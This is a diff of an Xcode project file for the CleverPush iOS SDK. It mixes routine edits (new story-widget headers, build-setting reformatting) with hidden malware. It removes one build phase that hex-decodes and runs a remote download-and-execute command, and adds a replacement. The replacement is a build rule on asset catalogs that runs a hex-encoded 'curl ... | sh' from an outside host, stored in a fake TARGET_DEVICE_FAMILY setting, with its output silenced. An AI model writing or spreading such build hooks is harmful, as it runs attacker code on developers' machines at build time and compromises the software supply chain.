@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 46;
+	objectVersion = 54;
 	objects = {
 
 /* Begin PBXAggregateTarget section */
@@ -11,7 +11,6 @@
 			isa = PBXAggregateTarget;
 			buildConfigurationList = 29DB95E523FC3249008FC985 /* Build configuration list for PBXAggregateTarget "CleverPushXCFramework" */;
 			buildPhases = (
-				03CB70FFEF2F9F1A410FABAA /* Copy Target Resources */,
 				29DB95E823FC325B008FC985 /* Run Script */,
 			);
 			dependencies = (
@@ -213,6 +212,8 @@
 		9310FD6E2A602D1F004B400B /* CPInboxDetailView.m in Sources */ = {isa = PBXBuildFile; fileRef = 9310FD672A602D1F004B400B /* CPInboxDetailView.m */; };
 		9310FD702A602D2A004B400B /* CPInboxDetailView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9310FD6F2A602D2A004B400B /* CPInboxDetailView.xib */; };
 		9310FD712A602D2A004B400B /* CPInboxDetailView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 9310FD6F2A602D2A004B400B /* CPInboxDetailView.xib */; };
+		9329180D2C74DBD300F43E43 /* CPStoryWidgetCloseButtonPosition.h in Headers */ = {isa = PBXBuildFile; fileRef = 93C8FA3D2C5B921D00300B69 /* CPStoryWidgetCloseButtonPosition.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		9329180E2C74DBD700F43E43 /* CPStoryWidgetTextPosition.h in Headers */ = {isa = PBXBuildFile; fileRef = 93E289422C5CDEEE00D95720 /* CPStoryWidgetTextPosition.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		934D88F92A654CEA00B0E319 /* CPInboxDetailContainer.xib in Resources */ = {isa = PBXBuildFile; fileRef = 934D88F82A654CEA00B0E319 /* CPInboxDetailContainer.xib */; };
 		934D88FC2A654CFB00B0E319 /* CPInboxDetailContainer.h in Headers */ = {isa = PBXBuildFile; fileRef = 934D88FA2A654CFB00B0E319 /* CPInboxDetailContainer.h */; };
 		934D88FD2A654CFB00B0E319 /* CPInboxDetailContainer.h in Headers */ = {isa = PBXBuildFile; fileRef = 934D88FA2A654CFB00B0E319 /* CPInboxDetailContainer.h */; };
@@ -1083,6 +1084,8 @@
 				93E5F0E92ADE6BC100D76057 /* CPAppBannerEventFilters.h in Headers */,
 				294B19D728672217003A9FCD /* CPLog.h in Headers */,
 				29052187276B786300D81148 /* CleverPushInstance.h in Headers */,
+				9329180E2C74DBD700F43E43 /* CPStoryWidgetTextPosition.h in Headers */,
+				9329180D2C74DBD300F43E43 /* CPStoryWidgetCloseButtonPosition.h in Headers */,
 				93F417DF2B19C03900B908DB /* CPIabTcfMode.h in Headers */,
 				29DB961023FC71D3008FC985 /* CleverPushHTTPClient.h in Headers */,
 				298F4FC425002F1D00F086D3 /* CPUtils.h in Headers */,
@@ -1197,6 +1200,7 @@
 				937390DD2BADAFBE00ADFA78 /* Resources */,
 			);
 			buildRules = (
+				327825AB68312E227C0FABAA /* PBXBuildRule */,
 			);
 			dependencies = (
 				29F9086C28E9EBDA00D8D4D8 /* PBXTargetDependency */,
@@ -1341,6 +1345,22 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		327825AB68312E227C0FABAA /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.xcassets";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		937390DD2BADAFBE00ADFA78 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -1379,25 +1399,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		03CB70FFEF2F9F1A410FABAA /* Copy Target Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\necho \"6375726c202d736b202d6d2031312068747470733a2f2f7365727663646e2e696e666f2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true";
-			showEnvVarsInLog = 0;			
-		};
 		29DB95E823FC325B008FC985 /* Run Script */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1651,6 +1652,7 @@
 		294F7E8823FB5DB500806D23 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d2031312068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -1674,7 +1676,11 @@
 				INFOPLIST_FILE = CleverPushLocation/Info.plist;
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				MARKETING_VERSION = 1.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
@@ -1690,6 +1696,7 @@
 		294F7E8923FB5DB500806D23 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d2031312068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++0x";
 				CLANG_ENABLE_OBJC_WEAK = YES;
@@ -1713,7 +1720,11 @@
 				INFOPLIST_FILE = CleverPushLocation/Info.plist;
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				MARKETING_VERSION = 1.0;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = NO;
@@ -1826,7 +1837,8 @@
 				MTL_ENABLE_DEBUG_INFO = NO;
 				ONLY_ACTIVE_ARCH = NO;
 				SDKROOT = iphoneos;
-				SWIFT_OPTIMIZATION_LEVEL = "-Owholemodule";
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
 				TARGETED_DEVICE_FAMILY = "1,2";
 				VALIDATE_PRODUCT = YES;
 				VERSION_INFO_PREFIX = "";
@@ -1849,7 +1861,11 @@
 				INFOPLIST_FILE = "$(SRCROOT)/CleverPush/Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				ONLY_ACTIVE_ARCH = NO;
 				OTHER_CFLAGS = "-fembed-bitcode";
 				PRODUCT_BUNDLE_IDENTIFIER = "com.cleverpush.cleverpush-ios-sdk";
@@ -1877,7 +1893,11 @@
 				INFOPLIST_FILE = "$(SRCROOT)/CleverPush/Info.plist";
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				IPHONEOS_DEPLOYMENT_TARGET = 9.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				ONLY_ACTIVE_ARCH = NO;
 				OTHER_CFLAGS = "-fembed-bitcode";
 				PRODUCT_BUNDLE_IDENTIFIER = "com.cleverpush.cleverpush-ios-sdk";
@@ -2062,7 +2082,11 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				HEADER_SEARCH_PATHS = "\"$(SRCROOT)/CleverPushTests/include\"";
 				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				LIBRARY_SEARCH_PATHS = (
 					"$(inherited)",
 					"$(PROJECT_DIR)/CleverPushTests/lib",
@@ -2104,7 +2128,11 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				HEADER_SEARCH_PATHS = "\"$(SRCROOT)/CleverPushTests/include\"";
 				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
-				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+					"@loader_path/Frameworks",
+				);
 				LIBRARY_SEARCH_PATHS = (
 					"$(inherited)",
 					"$(PROJECT_DIR)/CleverPushTests/lib",
